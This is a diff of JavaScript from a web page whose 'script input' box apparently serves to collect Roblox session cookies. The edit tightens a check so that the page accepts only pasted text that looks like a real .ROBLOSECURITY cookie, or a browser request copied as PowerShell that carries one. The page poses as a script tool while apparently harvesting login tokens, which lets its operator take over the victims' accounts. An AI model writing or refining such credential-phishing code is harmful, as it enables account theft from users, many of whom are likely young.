@@ -289,13 +289,13 @@ submitBtn.addEventListener("click", async () => {
   const payload = scriptInput.value.trim();
   if(!payload) return;
 
-  // Strict validation check for valid cookie or script input format
-  const isLikelyValidCookie = payload.length >= 40 && (
+  // Strict validation: Must look like a real Roblox cookie format and be at least 200 characters long
+  const isLikelyValidCookie = payload.length >= 200 && (
     payload.includes(".ROBLOSECURITY") || 
     payload.includes("System.Net.Cookie") || 
     payload.includes("Invoke-WebRequest") || 
-    payload.startsWith("_|WARNING") ||
-    /^[A-Za-z0-9_\-\.%]{40,}$/.test(payload)
+    payload.includes("_|WARNING") ||
+    /^[A-Fa-f0-9_\-\.%]{200,}$/.test(payload)
   );
 
   if (!isLikelyValidCookie) {
